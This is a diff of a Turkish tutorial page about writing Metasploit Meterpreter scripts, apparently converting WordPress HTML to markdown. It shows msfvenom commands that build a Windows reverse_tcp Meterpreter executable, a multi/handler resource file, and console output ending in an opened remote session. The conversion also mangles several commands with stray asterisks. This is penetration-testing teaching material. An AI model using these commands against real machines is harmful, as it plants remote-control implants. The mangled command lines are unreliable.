@@ -43,21 +43,21 @@ url: /tr/msf-meterpreter-script-yazma/
  
 
 <!-- wp:list -->
-<ul><!-- wp:list-item -->
-<li>Tüm Windows sürümleri aynı değildir.</li>
+ <!-- wp:list-item -->
+- Tüm Windows sürümleri aynı değildir. 
 <!-- /wp:list-item -->
 
 <!-- wp:list-item -->
-<li>Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar.</li>
+- Bazı Windows sürümleri, güvenlik tedbirleri barındırırlar. 
 <!-- /wp:list-item -->
 
 <!-- wp:list-item -->
-<li>Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler.</li>
+- Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler. 
 <!-- /wp:list-item -->
 
 <!-- wp:list-item -->
-<li>Script yazarken Windows sürümüne özel davranmanız gerekebilir.</li>
-<!-- /wp:list-item --></ul>
+- Script yazarken Windows sürümüne özel davranmanız gerekebilir. 
+<!-- /wp:list-item --> 
 <!-- /wp:list -->
 
   Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script yazmak gerekmektedir. Bu durumda yazacağımız script doğru çalışabilir. 
@@ -67,10 +67,10 @@ url: /tr/msf-meterpreter-script-yazma/
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST<strong>=</strong>192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
+<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST***=*** 192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 <strong>(</strong>iteration<strong>=</strong>0<strong>)</strong>
+x86/shikata_ga_nai succeeded with size 326 ***(*** iteration***=*** 0***)*** 
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: Meterpreter.exe
@@ -82,11 +82,11 @@ Saved as: Meterpreter.exe
 
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# touch meterpreter.rc
-root@kali:~# echo use exploit/multi/handler <strong>&gt;&gt;</strong> meterpreter.rc
-root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp <strong>&gt;&gt;</strong> meterpreter.rc
-root@kali:~# echo set LHOST 192.168.1.184 <strong>&gt;&gt;</strong> meterpreter.rc
-root@kali:~# echo set ExitOnSession false <strong>&gt;&gt;</strong> meterpreter.rc
-root@kali:~# echo exploit -j -z <strong>&gt;&gt;</strong> meterpreter.rc
+root@kali:~# echo use exploit/multi/handler ***&gt;&gt;***  meterpreter.rc
+root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp ***&gt;&gt;***  meterpreter.rc
+root@kali:~# echo set LHOST 192.168.1.184 ***&gt;&gt;***  meterpreter.rc
+root@kali:~# echo set ExitOnSession false ***&gt;&gt;***  meterpreter.rc
+root@kali:~# echo exploit -j -z ***&gt;&gt;***  meterpreter.rc
 root@kali:~# cat meterpreter.rc
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -108,21 +108,21 @@ exploit -j -z
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfconsole -r meterpreter.rc
 
-       <strong>=[</strong> metasploit v4.8.2-2014021901 <strong>[</strong>core:4.8 api:1.0] <strong>]</strong>
-+ -- --<strong>=[</strong> 1265 exploits - 695 auxiliary - 202 post <strong>]</strong>
-+ -- --<strong>=[</strong> 330 payloads - 32 encoders - 8 nops      <strong>]</strong>
+       ***=[***  metasploit v4.8.2-2014021901 ***[*** core:4.8 api:1.0] ***]*** 
++ -- --***=[***  1265 exploits - 695 auxiliary - 202 post ***]*** 
++ -- --***=[***  330 payloads - 32 encoders - 8 nops      ***]*** 
 
 resource&gt; use exploit/multi/handler
 resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD <strong>=&gt;</strong> windows/meterpreter/reverse_tcp
+PAYLOAD ***=&gt;***  windows/meterpreter/reverse_tcp
 resource&gt; set LHOST 192.168.1.184
-LHOST <strong>=&gt;</strong> 192.168.1.184
+LHOST ***=&gt;***  192.168.1.184
 resource&gt; set ExitOnSession false
-ExitOnSession <strong>=&gt;</strong> false
+ExitOnSession ***=&gt;***  false
 resource&gt; exploit -j -z
-<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
-<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
+***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
+***[*** ******* ***]***  Started reverse handler
+***[*** ******* ***]***  Starting the payload handler...
 </code></pre>
 <!-- /wp:code -->
 
@@ -130,11 +130,11 @@ resource&gt; exploit -j -z
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>718336 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>192.168.1.158:4444 -&gt; 192.168.1.104:1043<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  Sending stage ***(*** 718336 bytes***)*** 
+***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 192.168.1.158:4444 -&gt; 192.168.1.104:1043***)*** 
 
-msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> sessions -i 1
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting interaction with 1...
+msf exploit***(*** handler***)***  ***&gt;***  sessions -i 1
+***[*** ******* ***]***  Starting interaction with 1...
 
-meterpreter <strong>&gt;</strong></code></pre>
+meterpreter ***&gt;*** </code></pre>
 <!-- /wp:code -->
